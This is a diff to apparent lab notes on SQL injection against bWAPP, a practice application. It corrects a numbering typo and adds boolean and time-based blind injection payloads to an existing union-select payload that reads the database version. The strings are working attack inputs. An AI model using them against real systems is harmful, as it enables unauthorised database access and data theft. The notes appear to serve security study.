@@ -35,9 +35,20 @@ a)
 
 
 
-4SQL injection(POST/Select):
+4.SQL injection(POST/Select):
 
 Code : AND 0=1 union select 1,@@version,3,4,5,6,7 -- -&action=go
 
 In the Inspect Element edit the option value 
+
+
+5.SQL Blind Injection:
+i)Boolean
+      a) iron’ or 1=1 and database=’bWAPP’# - Check  the database exists
+       b) iron’ or 1=1 and substring(database(),1,1)=’b’#  Check the first letter of first word 
+
+ii) Time Based 
+a)	 cyber’ or 1=1 and sleep(10)#
+
+
 
